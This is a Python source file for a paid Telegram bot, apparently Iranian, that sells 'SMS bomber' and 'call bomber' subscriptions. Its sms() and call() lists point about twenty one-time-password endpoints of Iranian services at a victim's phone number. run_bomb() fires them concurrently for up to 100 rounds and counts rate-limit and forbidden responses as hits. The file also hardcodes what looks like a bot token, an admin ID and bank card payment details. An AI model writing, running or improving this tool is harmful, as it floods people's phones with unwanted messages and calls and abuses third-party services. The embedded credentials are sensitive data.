import asyncio, concurrent.futures, json, os, threading
from datetime import datetime, timedelta
import requests
from http.server import HTTPServer, BaseHTTPRequestHandler
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from aiogram.enums.button_style import ButtonStyle
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

TOKEN = "8224604758:AAEzJVoRtNQP3qX_zHUmOOGvx-XnIzjiOhg"
ADMIN = 2025464333
UFILE = "users.json"
CFILE = "config.json"
BLACKLIST = {"09966877513","+989966877513","989966877513","9966877513","09369107513","+989369107513","989369107513","9369107513","09220709576","+989220709576","989220709576","9220709576"}
HDR = {"User-Agent":"Mozilla/5.0","Content-Type":"application/json"}
DATA = {}
CONFIG = {"prices":{"1m":"100","3m":"250","6m":"450"},"codes":{},"bot_on":True,"card":"6037-9975-1234-5678","name":"ایلیا رجبی"}
bot = Bot(TOKEN)
dp = Dispatcher(storage=MemoryStorage())

class Bomb(StatesGroup): mode=State(); phone=State(); rounds=State()
class Buy(StatesGroup): plan=State(); card=State()
class AdminState(StatesGroup): wait_cmd=State(); wait_price_pl=State(); wait_price_val=State(); wait_code_name=State(); wait_code_val=State(); wait_card=State(); wait_name=State()

def load():
    global DATA, CONFIG
    if os.path.exists(UFILE):
        with open(UFILE) as f:
            for k,v in json.load(f).items():
                DATA[k]={"exp":datetime.fromisoformat(v.get("exp","2000-01-01")),"jo":datetime.fromisoformat(v.get("jo","2000-01-01")),"st":v.get("st",False),"used_test":v.get("used_test",False)}
    if os.path.exists(CFILE):
        with open(CFILE) as f: CONFIG=json.load(f)

def save():
    d={}
    for k,v in DATA.items():
        d[k]={"exp":v["exp"].isoformat() if isinstance(v["exp"],datetime) else str(v["exp"]),"jo":v["jo"].isoformat() if isinstance(v["jo"],datetime) else str(v["jo"]),"st":v.get("st",False),"used_test":v.get("used_test",False)}
    with open(UFILE,"w") as f: json.dump(d,f)
    with open(CFILE,"w") as f: json.dump(CONFIG,f)

def blk(p):
    if p in BLACKLIST: return True
    n=p.replace("+","").replace(" ","")
    if n in BLACKLIST: return True
    if n.startswith("98") and "0"+n[2:] in BLACKLIST: return True
    if n.startswith("0") and "98"+n[1:] in BLACKLIST: return True
    return False

def has_sub(uid):
    if int(uid)==ADMIN: return True
    dd=DATA.get(str(uid),{})
    if not dd: return False
    if dd.get("exp",datetime.min)<datetime.now(): return False
    return True

def sms(p):
    return [
        ["Lendo","https://api.lendo.ir/api/customer/auth/send-otp",{"mobile":p}],
        ["GapFilm","https://core.gapfilm.ir/api/v3.1/Account/Login",{"Type":"3","Username":p[1:]}],
        ["Achareh","https://api.achareh.co/v2/accounts/login/",{"phone":"98"+p[1:]}],
        ["Divar","https://api.divar.ir/v5/auth/authenticate",{"phone":p}],
        ["Tapsi","https://api.tapsi.ir/api/v2.2/user",{"credential":{"phoneNumber":p,"role":"DRIVER"},"otpOption":"SMS"}],
        ["Namava","https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",{"UserName":"+98"+p[1:]}],
        ["Bikoplus","https://bikoplus.com/account/check-phone-number",{"phoneNumber":p}],
        ["Jabama","https://gw.jabama.com/api/v4/account/send-code",{"mobile":p}],
        ["Khodro45","https://khodro45.com/api/v1/customers/otp/",{"mobile":p}],
        ["Snapp","https://api.snapp.ir/api/v1/sms/link",{"phone":p}],
        ["Alibaba","https://ws.alibaba.ir/api/v3/account/mobile/otp",{"phoneNumber":p[1:]}],
        ["Sheypoor","https://www.sheypoor.com/api/v10.0.0/auth/send",{"username":p}],
        ["Taaghche","https://gw.taaghche.com/v4/site/auth/signup",{"contact":p}],
        ["Snappfood","https://api.snappfood.ir/auth/mobile/send/v2",{"cellphone":p}],
        ["Banimode","https://mobapi.banimode.com/api/v2/auth/request",{"phone":p}],
        ["IToll","https://app.itoll.com/api/v1/auth/login",{"mobile":p}],
        ["Tap33","https://tap33.me/api/v2/user",{"credential":{"phoneNumber":p,"role":"BIKER"}}],
        ["Digikala","https://api.digikala.com/v1/user/authenticate/",{"username":p,"otp_call":False}],
        ["DigikalaJet","https://api.digikalajet.ir/user/login-register/",{"phone":p}],
    ]

def call(p):
    return [
        ["Digikala CALL","https://api.digikala.com/v1/user/authenticate/",{"username":p,"otp_call":True}],
        ["DigikalaJet CALL","https://api.digikalajet.ir/user/login-register/",{"phone":p}],
    ]

def menu_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🚀 استفاده از اشتراک",callback_data="use",style=ButtonStyle.PRIMARY)],
        [InlineKeyboardButton(text="💎 خرید اشتراک",callback_data="buy",style=ButtonStyle.SUCCESS),InlineKeyboardButton(text="🎟 تست رایگان",callback_data="test",style=ButtonStyle.PRIMARY)],
        [InlineKeyboardButton(text="👤 حساب کاربری",callback_data="account",style=ButtonStyle.SUCCESS)],
    ])

def mode_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💣 اس ام اس بمبر",callback_data="m_sms",style=ButtonStyle.PRIMARY)],
        [InlineKeyboardButton(text="📞 کال بمبر",callback_data="m_call",style=ButtonStyle.SUCCESS)],
        [InlineKeyboardButton(text="⚡ اس ام اس + کال",callback_data="m_all",style=ButtonStyle.DANGER)],
        [InlineKeyboardButton(text="← بازگشت",callback_data="menu")],
    ])

def plans_kb():
    pr=CONFIG.get("prices",{"1m":"100","3m":"250","6m":"450"})
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"🟢 یک ماهه - {pr.get('1m','100')} تومان",callback_data="p_1m",style=ButtonStyle.SUCCESS)],
        [InlineKeyboardButton(text=f"🟡 سه ماهه - {pr.get('3m','250')} تومان",callback_data="p_3m",style=ButtonStyle.PRIMARY)],
        [InlineKeyboardButton(text=f"🔴 شش ماهه - {pr.get('6m','450')} تومان",callback_data="p_6m",style=ButtonStyle.DANGER)],
        [InlineKeyboardButton(text="← بازگشت",callback_data="menu")],
    ])

def stop_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⏹ توقف بمبر",callback_data="stop",style=ButtonStyle.DANGER)],
    ])

def admin_kb():
    bot_on=CONFIG.get("bot_on",True)
    status_txt="🔴 ربات خاموش" if not bot_on else "🟢 ربات روشن"
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=status_txt,callback_data="adm_toggle",style=ButtonStyle.DANGER if bot_on else ButtonStyle.SUCCESS)],
        [InlineKeyboardButton(text="💰 تغییر قیمت",callback_data="adm_price",style=ButtonStyle.PRIMARY)],
        [InlineKeyboardButton(text="🎫 مدیریت کد تخفیف",callback_data="adm_code",style=ButtonStyle.SUCCESS)],
        [InlineKeyboardButton(text="💳 تغییر کارت بانکی",callback_data="adm_card",style=ButtonStyle.PRIMARY)],
        [InlineKeyboardButton(text="👤 تغییر نام صاحب کارت",callback_data="adm_name",style=ButtonStyle.SUCCESS)],
        [InlineKeyboardButton(text="📊 آمار کاربران",callback_data="adm_stats",style=ButtonStyle.PRIMARY)],
        [InlineKeyboardButton(text="← بازگشت به منو",callback_data="menu")],
    ])

@dp.message(Command("start"))
async def start(m:types.Message):
    await m.answer("╔══════════════════════╗\n║   💣 ILIYA SMS BOT   ║\n║  اس ام اس و کال بمبر ║\n╚══════════════════════╝\n\nیک گزینه رو انتخاب کن:",reply_markup=menu_kb())
    if m.from_user.id==ADMIN: await m.answer("🔧 **پنل ادمین:** /admin",reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔧 پنل مدیریت",callback_data="adm_panel",style=ButtonStyle.PRIMARY)]]))

@dp.message(Command("admin"))
async def admin_cmd(m:types.Message):
    if m.from_user.id!=ADMIN: return
    await m.answer("🔧 **پنل مدیریت**",reply_markup=admin_kb())

@dp.callback_query(F.data=="use")
async def use_sub(cb:types.CallbackQuery,state:FSMContext):
    if not has_sub(cb.from_user.id):
        await cb.answer("❌ اشتراک نداری! اول اشتراک بخر.",show_alert=True)
        return
    await state.set_state(Bomb.mode)
    await cb.message.edit_text("✅ **انتخاب مدل بمبر:**",reply_markup=mode_kb())

@dp.callback_query(F.data.startswith("m_"),Bomb.mode)
async def mode_pick(cb:types.CallbackQuery,state:FSMContext):
    await state.update_data(mode=cb.data[2:])
    await state.set_state(Bomb.phone)
    await cb.message.edit_text("📱 **شماره موبایل رو وارد کن:**\nمثال: `09121234567`")

@dp.message(Bomb.phone)
async def phone_get(m:types.Message,state:FSMContext):
    p=m.text.strip()
    if blk(p): await m.answer("⚠️ **شماره نامعتبر!**");return
    await state.update_data(phone=p)
    await state.set_state(Bomb.rounds)
    await m.answer("🔢 **چند راند؟**")

@dp.message(Bomb.rounds)
async def rounds_get(m:types.Message,state:FSMContext):
    r=m.text.strip()
    if not r.isdigit() or int(r)<1 or int(r)>100: await m.answer("۱ تا ۱۰۰");return
    d=await state.get_data();await state.clear()
    await run_bomb(m,int(r),d["mode"],d["phone"])

@dp.callback_query(F.data=="stop")
async def stop_bomb(cb:types.CallbackQuery):
    DATA.setdefault(str(cb.from_user.id),{})["st"]=True;save()
    await cb.answer("⏹ توقف ثبت شد")

@dp.callback_query(F.data=="buy")
async def buy_menu(cb:types.CallbackQuery):
    await cb.message.edit_text("💎 **انتخاب پلن:**",reply_markup=plans_kb())

@dp.callback_query(F.data.startswith("p_"))
async def plan_pick(cb:types.CallbackQuery,state:FSMContext):
    pl=cb.data[2:];nm={"1m":"یک ماهه","3m":"سه ماهه","6m":"شش ماهه"};pr=CONFIG.get("prices",{"1m":"100","3m":"250","6m":"450"})
    await state.update_data(plan=pl)
    await state.set_state(Buy.card)
    await cb.message.edit_text(f"💳 **پلن {nm[pl]} - {pr.get(pl,'?')} تومان**\n\nروش پرداخت:",reply_markup=InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💳 کارت به کارت",callback_data=f"pay_{pl}",style=ButtonStyle.PRIMARY)],
        [InlineKeyboardButton(text="🎫 کد تخفیف",callback_data=f"code_{pl}",style=ButtonStyle.SUCCESS)],
        [InlineKeyboardButton(text="← بازگشت",callback_data="buy")],
    ]))

@dp.callback_query(F.data.startswith("code_"))
async def code_use(cb:types.CallbackQuery,state:FSMContext):
    pl=cb.data[5:]
    await state.update_data(plan=pl)
    await cb.message.edit_text("🎫 **کد تخفیف رو وارد کن:**",reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="← بازگشت",callback_data=f"p_{pl}")]]))
    await state.set_state(Buy.card)

@dp.callback_query(F.data.startswith("pay_"))
async def pay_card(cb:types.CallbackQuery,state:FSMContext):
    pl=cb.data[4:];nm={"1m":"یک ماهه","3m":"سه ماهه","6m":"شش ماهه"};pr=CONFIG.get("prices",{"1m":"100","3m":"250","6m":"450"})
    await state.update_data(plan=pl)
    await state.set_state(Buy.card)
    await cb.message.edit_text(f"💳 **پلن {nm[pl]} - {pr.get(pl,'?')} تومان**\n\nکارت: `{CONFIG.get('card','6037-9975-1234-5678')}`\nبه نام: **{CONFIG.get('name','ایلیا رجبی')}**\n\n📸 عکس فیش رو بفرست:",reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="← بازگشت",callback_data=f"p_{pl}")]]))

@dp.message(Buy.card)
async def card_input(m:types.Message,state:FSMContext):
    t=m.text.strip()
    d=await state.get_data();pl=d.get("plan","1m")
    nm={"1m":"یک ماهه","3m":"سه ماهه","6m":"شش ماهه"};pr=CONFIG.get("prices",{"1m":"100","3m":"250","6m":"450"})
    codes=CONFIG.get("codes",{})
    if t in codes:
        u=str(m.from_user.id)
        days=codes[t];del codes[t];CONFIG["codes"]=codes;save()
        DATA[u]={"exp":datetime.now()+timedelta(days=days),"jo":DATA.get(u,{}).get("jo",datetime.now()),"st":False,"used_test":DATA.get(u,{}).get("used_test",False)};save()
        await state.clear()
        await m.answer(f"✅ کد تخفیف پذیرفته شد! {days} روز اشتراک فعال شد.")
        return
    await m.answer("📸 لطفاً **عکس فیش** رو بفرست، نه متن.")

@dp.message(Buy.card,F.photo)
async def receipt(m:types.Message,state:FSMContext):
    u=str(m.from_user.id);d=await state.get_data();pl=d.get("plan","1m")
    nm={"1m":"یک ماهه","3m":"سه ماهه","6m":"شش ماهه"};pr=CONFIG.get("prices",{"1m":"100","3m":"250","6m":"450"})
    await state.clear()
    await bot.send_photo(ADMIN,m.photo[-1].file_id,
        caption=f"📩 **فیش واریزی جدید**\n\n👤 `{u}` - {m.from_user.first_name}\n💎 پلن: {nm.get(pl,pl)} - {pr.get(pl,'?')} تومان",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton(text="✅ تایید",callback_data=f"app_{u}_{pl}",style=ButtonStyle.SUCCESS),
            InlineKeyboardButton(text="❌ رد",callback_data=f"rej_{u}",style=ButtonStyle.DANGER)]]))
    await m.answer("✅ فیش برای ادمین ارسال شد. منتظر تایید باش.")

@dp.callback_query(F.data.startswith("app_"))
async def approve(cb:types.CallbackQuery):
    p=cb.data.split("_");uid=p[1];pl=p[2]
    days={"1m":30,"3m":90,"6m":180}
    DATA[uid]={"exp":datetime.now()+timedelta(days=days.get(pl,30)),"jo":DATA.get(uid,{}).get("jo",datetime.now()),"st":False,"used_test":DATA.get(uid,{}).get("used_test",False)};save()
    await cb.message.edit_text(cb.message.text+"\n\n✅ **تایید شد!**")
    try: await bot.send_message(int(uid),"✅ اشتراکت تایید شد! الان میتونی استفاده کنی.")
    except: pass

@dp.callback_query(F.data.startswith("rej_"))
async def reject(cb:types.CallbackQuery):
    uid=cb.data.split("_")[1]
    await cb.message.edit_text(cb.message.text+"\n\n❌ **رد شد.**")
    try: await bot.send_message(int(uid),"❌ پرداخت تایید نشد.")
    except: pass

@dp.callback_query(F.data=="test")
async def test_free(cb:types.CallbackQuery):
    u=str(cb.from_user.id)
    if DATA.get(u,{}).get("used_test"):
        await cb.answer("❌ قبلا از تست رایگان استفاده کردی!",show_alert=True)
        return
    DATA[u]={"exp":datetime.now()+timedelta(days=1),"jo":datetime.now(),"st":False,"used_test":True};save()
    await cb.message.edit_text("✅ تست ۱ روزه فعال شد!",reply_markup=menu_kb())

@dp.callback_query(F.data=="account")
async def account(cb:types.CallbackQuery):
    u=str(cb.from_user.id);dd=DATA.get(u,{});exp=dd.get("exp",datetime.min);jo=dd.get("jo",datetime.min)
    if isinstance(exp,datetime):
        rem=exp-datetime.now();rt=f"{rem.days} روز {rem.seconds//3600} ساعت" if rem.total_seconds()>0 else "❌ منقضی شده"
        et=exp.strftime("%Y/%m/%d - %H:%M")
    else: rt="❌ فعال نیست";et="-"
    jt=jo.strftime("%Y/%m/%d") if isinstance(jo,datetime) and jo.year>2000 else "-"
    await cb.message.edit_text(f"👤 **حساب کاربری**\n\n🔑 شناسه: `{u}`\n📅 عضویت: {jt}\n⏳ باقیمانده: {rt}\n📅 پایان: {et}",reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="← بازگشت",callback_data="menu")]]))

@dp.callback_query(F.data=="menu")
async def back_menu(cb:types.CallbackQuery,state:FSMContext):
    await state.clear()
    await cb.message.edit_text("یک گزینه رو انتخاب کن:",reply_markup=menu_kb())

@dp.callback_query(F.data=="adm_panel")
async def adm_panel(cb:types.CallbackQuery):
    if cb.from_user.id!=ADMIN: return
    await cb.message.edit_text("🔧 **پنل مدیریت**",reply_markup=admin_kb())

@dp.callback_query(F.data=="adm_toggle")
async def adm_toggle(cb:types.CallbackQuery):
    if cb.from_user.id!=ADMIN: return
    CONFIG["bot_on"]=not CONFIG.get("bot_on",True);save()
    await cb.message.edit_text("🔧 **پنل مدیریت**",reply_markup=admin_kb())

@dp.callback_query(F.data=="adm_price")
async def adm_price_menu(cb:types.CallbackQuery):
    if cb.from_user.id!=ADMIN: return
    pr=CONFIG.get("prices",{})
    await cb.message.edit_text(f"💰 **قیمت‌های فعلی:**\n1M={pr.get('1m','?')} | 3M={pr.get('3m','?')} | 6M={pr.get('6m','?')}\n\nکدوم پلن رو میخوای تغییر بدی؟",reply_markup=InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🟢 یک ماهه",callback_data="pr_1m",style=ButtonStyle.SUCCESS),InlineKeyboardButton(text="🟡 سه ماهه",callback_data="pr_3m",style=ButtonStyle.PRIMARY),InlineKeyboardButton(text="🔴 شش ماهه",callback_data="pr_6m",style=ButtonStyle.DANGER)],
        [InlineKeyboardButton(text="← بازگشت",callback_data="adm_panel")]]))

@dp.callback_query(F.data.startswith("pr_"))
async def adm_price_pick(cb:types.CallbackQuery,state:FSMContext):
    if cb.from_user.id!=ADMIN: return
    await state.set_state(AdminState.wait_price_val)
    await state.update_data(price_pl=cb.data[3:])
    await cb.message.edit_text("💰 قیمت جدید رو به تومان وارد کن:",reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="← بازگشت",callback_data="adm_price")]]))

@dp.message(AdminState.wait_price_val)
async def adm_price_set(m:types.Message,state:FSMContext):
    if m.from_user.id!=ADMIN: return
    d=await state.get_data();pl=d["price_pl"];v=m.text.strip()
    CONFIG.setdefault("prices",{})[pl]=v;save();await state.clear()
    await m.answer(f"✅ قیمت {pl} به {v} تومان تغییر کرد.")

@dp.callback_query(F.data=="adm_code")
async def adm_code_menu(cb:types.CallbackQuery,state:FSMContext):
    if cb.from_user.id!=ADMIN: return
    codes=CONFIG.get("codes",{})
    cl="\n".join([f"`{k}`: {v} روز" for k,v in codes.items()]) if codes else "هیچ کدی وجود نداره"
    await state.set_state(AdminState.wait_code_name)
    await cb.message.edit_text(f"🎫 **کدهای تخفیف:**\n{cl}\n\nکد جدید رو وارد کن (متن کد):",reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="← بازگشت",callback_data="adm_panel")]]))

@dp.message(AdminState.wait_code_name)
async def adm_code_name(m:types.Message,state:FSMContext):
    if m.from_user.id!=ADMIN: return
    await state.update_data(code_name=m.text.strip())
    await state.set_state(AdminState.wait_code_val)
    await m.answer("📅 چند روز؟ (عدد)")

@dp.message(AdminState.wait_code_val)
async def adm_code_set(m:types.Message,state:FSMContext):
    if m.from_user.id!=ADMIN: return
    d=await state.get_data();cn=d["code_name"];cv=int(m.text.strip())
    CONFIG.setdefault("codes",{})[cn]=cv;save();await state.clear()
    await m.answer(f"✅ کد `{cn}` برای {cv} روز ساخته شد.")

@dp.callback_query(F.data=="adm_card")
async def adm_card_req(cb:types.CallbackQuery,state:FSMContext):
    if cb.from_user.id!=ADMIN: return
    await state.set_state(AdminState.wait_card)
    await cb.message.edit_text(f"💳 کارت فعلی: `{CONFIG.get('card','?')}`\n\nکارت جدید:",reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="← بازگشت",callback_data="adm_panel")]]))

@dp.message(AdminState.wait_card)
async def adm_card_set(m:types.Message,state:FSMContext):
    if m.from_user.id!=ADMIN: return
    CONFIG["card"]=m.text.strip();save();await state.clear()
    await m.answer("✅ کارت بانکی آپدیت شد.")

@dp.callback_query(F.data=="adm_name")
async def adm_name_req(cb:types.CallbackQuery,state:FSMContext):
    if cb.from_user.id!=ADMIN: return
    await state.set_state(AdminState.wait_name)
    await cb.message.edit_text(f"👤 نام فعلی: {CONFIG.get('name','?')}\n\nنام جدید:",reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="← بازگشت",callback_data="adm_panel")]]))

@dp.message(AdminState.wait_name)
async def adm_name_set(m:types.Message,state:FSMContext):
    if m.from_user.id!=ADMIN: return
    CONFIG["name"]=m.text.strip();save();await state.clear()
    await m.answer("✅ نام صاحب کارت آپدیت شد.")

@dp.callback_query(F.data=="adm_stats")
async def adm_stats(cb:types.CallbackQuery):
    if cb.from_user.id!=ADMIN: return
    total=len(DATA);active=sum(1 for v in DATA.values() if isinstance(v.get("exp",datetime.min),datetime) and v["exp"]>datetime.now())
    await cb.message.edit_text(f"📊 **آمار**\n\n👥 کل کاربران: {total}\n✅ اشتراک فعال: {active}\n❌ منقضی: {total-active}",reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="← بازگشت",callback_data="adm_panel")]]))

async def run_bomb(msg,rds,mode,phone):
    u=str(msg.from_user.id)
    if not CONFIG.get("bot_on",True) and int(u)!=ADMIN: await msg.answer("🔴 ربات در حال حاضر خاموش است.");return
    DATA.setdefault(u,{})["st"]=False;save()
    if mode=="all": apis=call(phone)+sms(phone)
    elif mode=="call": apis=call(phone)
    else: apis=sms(phone)
    total=len(apis)*rds;ok=fl=stp=0
    sm=await msg.answer(f"🔥 **در حال ارسال...**\n📞 `{phone}`\n✅0 ❌0 ⏹0\n0/{total}",reply_markup=stop_kb())
    loop=asyncio.get_event_loop()
    for rd in range(rds):
        if DATA.get(u,{}).get("st"): stp+=len(apis)*(rds-rd);break
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
            futs=[loop.run_in_executor(ex,_snd,a,u) for a in apis]
            for coro in asyncio.as_completed(futs):
                r=await coro
                if r=="ok":ok+=1
                elif r=="stop":stp+=1
                else: fl+=1
                if (ok+fl+stp)%5==0:
                    try:await sm.edit_text(f"🔥 **در حال ارسال...**\n📞 `{phone}`\n✅{ok} ❌{fl} ⏹{stp}\n{ok+fl+stp}/{total}",reply_markup=stop_kb())
                    except:pass
        if rd<rds-1 and not DATA.get(u,{}).get("st"):await asyncio.sleep(.3)
    await sm.edit_text(f"✅ **تموم شد!**\n📞 `{phone}`\n✅{ok} ❌{fl} ⏹{stp}")

def _snd(api,uid):
    if DATA.get(str(uid),{}).get("st"):return"stop"
    n,u,d=api
    try:
        r=requests.post(u,json=d,headers=HDR,timeout=8)
        return"ok"if r.status_code in(200,201,202,204,400,401,403,422,429)else"fail"
    except:return"err"

class H(BaseHTTPRequestHandler):
    def do_GET(self):self.send_response(200);self.end_headers();self.wfile.write(b"OK")

@dp.message()
async def fallback(m:types.Message):
    if not CONFIG.get("bot_on",True): await m.answer("🔴 ربات خاموشه. بعدا بیا.");return

if __name__=="__main__":
    load()
    threading.Thread(target=lambda:HTTPServer(("0.0.0.0",10000),H).serve_forever(),daemon=True).start()
    print("Bot running...")
    dp.run_polling(bot)
